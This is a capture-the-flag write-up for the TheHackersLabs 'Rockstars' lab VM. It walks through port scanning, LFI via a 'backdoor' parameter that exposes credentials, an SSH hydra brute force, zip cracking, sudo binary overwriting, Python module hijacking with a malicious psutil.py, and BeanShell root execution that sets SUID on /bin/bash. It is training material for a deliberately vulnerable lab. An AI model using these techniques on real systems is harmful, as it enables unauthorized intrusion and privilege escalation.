---
title: "TheHackersLabs Rockstars Writeup"
date: 2026-05-01 08:00:00 +0000
categories: [TheHackersLabs, Writeups]
tags: [thehackerslabs, ctf]
description: "A comprehensive guide to compromising the Rockstars machine, from initial enumeration to root exploitation."
image:
  path: /assets/img/posts/thehackerslabs/rockstars/rockstars.png
---

## Reconnaissance — Port Scan

We begin the engagement by performing a SYN scan using `nmap` to discover open TCP ports across the entire range, identifying the initial attack surface.

```bash
┌──(suraxddq㉿kali)-[~]
└─$ sudo nmap -sS -p- --open --min-rate 5000 -vvv -n 192.168.0.19
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-14 11:44 +0100
Initiating ARP Ping Scan at 11:44
Scanning 192.168.0.19 [1 port]
Completed ARP Ping Scan at 11:44, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 11:44
Scanning 192.168.0.19 [65535 ports]
Discovered open port 80/tcp on 192.168.0.19
Discovered open port 22/tcp on 192.168.0.19
Completed SYN Stealth Scan at 11:44, 0.48s elapsed (65535 total ports)
Nmap scan report for 192.168.0.19
Host is up, received arp-response (0.000064s latency).
Scanned at 2026-03-14 11:44:30 CET for 1s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:18:4E:EC (Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.70 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```


## Reconnaissance — Service Versions & Scripts

Following the port discovery, we execute a targeted `nmap` scan against the open ports (22 and 80) to fingerprint the exact service versions and run default enumeration scripts. This is critical for identifying potential vulnerabilities linked to specific software releases.

```bash
┌──(suraxddq㉿kali)-[~]
└─$ nmap -sVC -p22,80 192.168.0.19
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-14 11:46 +0100
Nmap scan report for mailforge.nyx (192.168.0.19)
Host is up (0.00058s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)
|_  256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 08:00:27:18:4E:EC (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.80 seconds
```


## Web — Directory Brute-Forcing

To map the web application's structure, we utilize `feroxbuster` for directory brute-forcing. This automated process tests a comprehensive wordlist against the server to uncover hidden endpoints, administrative panels, or unlinked files.

```bash
┌──(suraxddq㉿kali)-[~]
└─$ feroxbuster --url http://192.168.0.19 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,bak,zip

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.0.19/
 🚩  In-Scope Url          │ 192.168.0.19
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, html, txt, bak, zip]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        0l        0w        0c http://192.168.0.19/
500      GET        1l        5w       19c http://192.168.0.19/index.php
200      GET        0l        0w        0c http://192.168.0.19/index.html
200      GET        0l        0w        0c http://192.168.0.19/db.php
301      GET        9l       28w      317c http://192.168.0.19/javascript => http://192.168.0.19/javascript/
[>-------------------] - 14s   106549/2646564 6m      found:5       errors:0      
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_192_168_0_19_-1773485246.state ...
[>-------------------] - 14s   106615/2646564 6m      found:5       errors:0      
[#>------------------] - 14s    70914/1323276 4914/s  http://192.168.0.19/ 
[>-------------------] - 14s    35382/1323276 2616/s  http://192.168.0.19/javascript/   
```


![](/assets/img/posts/thehackerslabs/rockstars/Pasted_image_20260314114830.png)


## Web — Fuzzing Index Parameters

Suspecting a Local File Inclusion (LFI) vulnerability—which allows an attacker to read internal server files—we use `ffuf` to fuzz the `index.php` parameters. We target `/etc/passwd` as our payload to confirm the flaw and successfully identify the vulnerable `backdoor` parameter.

```bash
┌──(suraxddq㉿kali)-[~]
└─$ ffuf -w big.txt -u "http://192.168.0.19/index.php" -d "FUZZ=/etc/passwd" -H "Content-Type: application/x-www-form-urlencoded" -fs 19

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://192.168.0.19/index.php
 :: Wordlist         : FUZZ: /home/suraxddq/Downloads/big.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : FUZZ=/etc/passwd
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 19
________________________________________________

backdoor                [Status: 200, Size: 1575, Words: 12, Lines: 31, Duration: 13ms]
```



## Exploitation — Reading Local Files via Parameter

Leveraging the confirmed LFI vulnerability via the `backdoor` parameter, we extract the contents of `db.php`. Inspecting the application's source code reveals hardcoded backend credentials for the user `shark`.

```bash
┌──(suraxddq㉿kali)-[~]
└─$ curl -XPOST 192.168.0.19/index.php -d "backdoor=/var/www/html/db.php"
Yo no soy tu marido<?php
$usuario = "shark";
$contrasena = "djbasdnbasdas&$AAAALLthl"; 
?>
```

shark : djbasdnbasdas&$AAAALLthl


## Lateral Movement — Connecting as Shark

Using the extracted credentials, we authenticate via SSH (Secure Shell) to establish our initial foothold on the machine as the user `shark`.

```bash
┌──(suraxddq㉿kali)-[~]
└─$ ssh shark@192.168.0.19                                       
shark@192.168.0.19's password: 
Linux TheHackersLabs-RockstarS 6.1.0-26-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1 (2024-09-30) x86_64

           /^\/^\
         _|__|  O|
\/     /~     \_/ \
 \____|__________/  \
        \_______      \
                `\     \                 \
                  |     |                  \
                 /      /                    \
                /     /                       \\
              /      /                         \ \
             /     /                            \  \
           /     /             _----_            \   \
          /     /           _-~      ~-_         |   |
         (      (        _-~    _--_    ~-_     _/   |
          \      ~-____-~    _-~    ~-_    ~-_-~    /
            ~-_           _-~          ~-_       _-~
               ~--______-~                ~-___-~

You have new mail.
Last login: Sat Mar 14 11:05:18 2026 from 192.168.0.11
shark@TheHackersLabs-RockstarS:~$ 
```


## Privilege Escalation — Checking Sudo Permissions

Our immediate goal is privilege escalation. We execute `sudo -l` to enumerate commands that `shark` can run with elevated privileges. We discover permission to execute `/home/shark/bof` as the user `wvverez` without a password requirement.

```bash
shark@TheHackersLabs-RockstarS:~$ sudo -l
sudo: unable to resolve host TheHackersLabs-RockstarS: Nombre o servicio desconocido
Matching Defaults entries for shark on TheHackersLabs-RockstarS:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User shark may run the following commands on TheHackersLabs-RockstarS:
    (wvverez) NOPASSWD: /home/shark/bof
```


## Privilege Escalation — Analyzing the 'bof' Binary

Upon inspecting the `bof` binary, we note that it is owned by our current user, granting us write access. Instead of exploiting the binary's logic, we can simply overwrite it with a script that invokes `bash`, bypassing its intended functionality entirely.

```bash
shark@TheHackersLabs-RockstarS:~$ file bof 
bof: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=ed643dfe8d026b7238d3033b0d0bcc499504f273, not stripped
```


## Privilege Escalation — Abusing Binary Execution

By executing our modified `bof` file through `sudo`, the system runs it under the context of `wvverez`. Since the file now simply requests a shell, we successfully pivot into a `wvverez` terminal session.

```bash
shark@TheHackersLabs-RockstarS:~$ echo "bash" > bof 
shark@TheHackersLabs-RockstarS:~$ sudo -u wvverez /home/shark/bof 
sudo: unable to resolve host TheHackersLabs-RockstarS: Nombre o servicio desconocido
wvverez@TheHackersLabs-RockstarS:/home/shark$ 
```


## Post-exploitation — Discovering Encrypted Zip

During our post-exploitation enumeration within `wvverez`'s home directory, we discover an intriguing compressed archive named `rubiales.zip`.

```bash
wvverez@TheHackersLabs-RockstarS:~$ ls -l
total 4
-rw-r--r-- 1 root    root     366 mar 12 17:45 rubiales.zip
```


## Post-exploitation — Attempting Default Unzip

We attempt to decompress the archive locally, but the operation halts because the file is protected by a strong password encryption.

```bash
┌──(suraxddq㉿kali)-[~]
└─$ unzip rub.zip
Archive:  rub.zip
[rub.zip] passwords.txt password: 
```

## Post-exploitation — Generating Zip Hash

To recover the password, we first need to extract the archive's cryptographic hash. We use `zip2john` to convert the encrypted Zip into a hash format compatible with password cracking tools.

```bash
┌──(suraxddq㉿kali)-[~]
└─$ zip2john rub.zip > hash
ver 2.0 efh 5455 efh 7875 rub.zip/passwords.txt PKZIP Encr: TS_chk, cmplen=174, decmplen=295, crc=8E99C328 ts=8D21 cs=8d21 type=8
```

## Post-exploitation — Cracking Zip Hash

We deploy John the Ripper (`john`) alongside the comprehensive `rockyou.txt` wordlist against the extracted hash. The tool rapidly cracks the hash, revealing the master password: "princess".

```bash
┌──(suraxddq㉿kali)-[~]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Created directory: /home/suraxddq/.john
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
princess         (rub.zip/passwords.txt)     
1g 0:00:00:00 DONE (2026-03-14 12:02) 100.0g/s 2457Kp/s 2457Kc/s 2457KC/s 123456..280789
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```


## Post-exploitation — Extracting Passwords

With the master password acquired, we successfully extract the contents of the zip file, uncovering a text file (`passwords.txt`) filled with a custom list of potential passwords.

```bash
┌──(suraxddq㉿kali)-[~]
└─$ unzip rub.zip
Archive:  rub.zip
[rub.zip] passwords.txt password: 
  inflating: passwords.txt           

┌──(suraxddq㉿kali)-[~]
└─$ cat passwords.txt
dadADASJNDAKNd1dadad
ajdjAsdaddiandas12313
kmdalskdmasdnmaskj126
djasndjasndjnasdjna12
dasdjnasjdknasdasd098
mkkdjasdasdasdasdada1
dasdjknadnasjdasjldas5
dkjandnkasndasjndjasd12
ldjnansdklnmasldasdd01
dljnasndkjasndjnasdja12
gjndkaskdasjdasndansdn
1dkjnandjkasndjasndjdd
djnasdnsadjnasldnaldn12
```


## Post-exploitation — Enumerable Users

To effectively utilize the newly acquired password list, we analyze the system's `/etc/passwd` file and dynamically catalog the active users, identifying a notable target named `loseey`.

```bash
┌──(suraxddq㉿kali)-[~]
└─$ cat users
wvverez
loseey
username3
```

## Lateral Movement — Brute-Forcing SSH via Hydra

We launch a targeted dictionary attack against the SSH service using `hydra`. By iterating the extracted password list against our enumerated usernames, we successfully identify a valid credential pair for the `loseey` account.

```bash
┌──(suraxddq㉿kali)-[~]
└─$ hydra -L users -P passwords.txt ssh://192.168.0.19 -u -f -I -t64 
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-14 12:05:10
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 39 tasks per 1 server, overall 39 tasks, 39 login tries (l:3/p:13), ~1 try per task
[DATA] attacking ssh://192.168.0.19:22/
[22][ssh] host: 192.168.0.19   login: loseey   password: kmdalskdmasdnmaskj126
[STATUS] attack finished for 192.168.0.19 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-14 12:05:11
```


## Lateral Movement — SSH as Loseey

We authenticate into the server via SSH using the newly cracked credentials, successfully transitioning our access to the `loseey` user account.

```bash
┌──(suraxddq㉿kali)-[~]
└─$ ssh loseey@192.168.0.19
loseey@192.168.0.19's password: 
Linux TheHackersLabs-RockstarS 6.1.0-26-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1 (2024-09-30) x86_64

           /^\/^\
         _|__|  O|
\/     /~     \_/ \
 \____|__________/  \
        \_______      \
                `\     \                 \
                  |     |                  \
                 /      /                    \
                /     /                       \\
              /      /                         \ \
             /     /                            \  \
           /     /             _----_            \   \
          /     /           _-~      ~-_         |   |
         (      (        _-~    _--_    ~-_     _/   |
          \      ~-____-~    _-~    ~-_    ~-_-~    /
            ~-_           _-~          ~-_       _-~
               ~--______-~                ~-___-~

You have new mail.
loseey@TheHackersLabs-RockstarS:~$ sudo -l
sudo: unable to resolve host TheHackersLabs-RockstarS: Nombre o servicio desconocido
Matching Defaults entries for loseey on TheHackersLabs-RockstarS:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User loseey may run the following commands on TheHackersLabs-Rockstar
    (username3) NOPASSWD: /usr/bin/python3 /home/loseey/rubiales.py
```


## Privilege Escalation — Analyzing Python Scripts

Re-evaluating our `sudo` privileges as `loseey`, we find we can execute a Python script (`rubiales.py`) as the user `username3`. Reviewing its source code reveals it imports an external module named `psutil`.

```bash
loseey@TheHackersLabs-RockstarS:~$ cat rubiales.py 
import psutil


def print_virtual_memory():
    vm = psutil.virtual_memory()
    print(f"Total: {vm.total} Available: {vm.available}")


if __name__ == "__main__":
    print_virtual_memory()
```

## Privilege Escalation — Poisoning Psutil Library

Python's module resolution prioritizes the current working directory before checking system paths. We exploit this by creating a malicious `psutil.py` file in our directory, embedding a payload that spawns a `bash` shell.

```bash
loseey@TheHackersLabs-RockstarS:~$ cat psutil.py 
import os
os.system("bash")
```


## Privilege Escalation — Injecting via Python

When we execute `rubiales.py` using `sudo` as `username3`, the script inadvertently loads our malicious `psutil` module instead of the legitimate one, instantly spawning a shell and pivoting our context to `username3`.

```bash
loseey@TheHackersLabs-RockstarS:~$ sudo -u username3 /usr/bin/python3 /home/loseey/rubiales.py 
sudo: unable to resolve host TheHackersLabs-RockstarS: Nombre o servicio desconocido
username3@TheHackersLabs-RockstarS:/home/loseey$ 
```


## Privilege Escalation — Checking Sudo for Username3

Continuing our enumeration as `username3`, we execute `sudo -l` and discover we have unrestricted access to run `/usr/bin/bsh` as `root` without requiring a password.

```bash
username3@TheHackersLabs-RockstarS:/home/loseey$ sudo -l
sudo: unable to resolve host TheHackersLabs-RockstarS: Nombre o servicio desconocido
Matching Defaults entries for username3 on TheHackersLabs-RockstarS:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User username3 may run the following commands on TheHackersLabs-RockstarS:
    (root) NOPASSWD: /usr/bin/bsh
```



## Privilege Escalation — Abusing Beanshell (bsh) as Root

The `/usr/bin/bsh` binary is BeanShell, a Java source interpreter. Running it with `sudo` gives us a root-level Java execution environment. We use the `exec("id");` payload to confirm our command execution context as the root user.

```bash
username3@TheHackersLabs-RockstarS:/home/loseey$ sudo /usr/bin/bsh
sudo: unable to resolve host TheHackersLabs-RockstarS: Nombre o servicio desconocido
BeanShell 2.0b4 - by Pat Niemeyer (pat@pat.net)
bsh % exec("id");
uid=0(root) gid=0(root) grupos=0(root)
```

## Flags — Gaining Root Shell

To establish a more stable operating environment, we execute a command within BeanShell to assign the SUID bit to `/bin/bash`. This allows us to spawn a persistent, interactive bash shell with root privileges by subsequently executing `bash -p`.

```bash
bsh % exec("chmod +s /bin/bash");
bsh % Tiene correo nuevo en /var/mail/username3
username3@TheHackersLabs-RockstarS:/home/loseey$ bash -p
bash-5.2# 
```


## Flags — Reading Final Flags

Now operating with full administrative control, we navigate the filesystem to harvest the user and root flags, formally completing the compromise of the system.

```bash
bash-5.2# cat user.txt 
ASss31******
bash-5.2# cat /root/root.txt 
aSAS***
```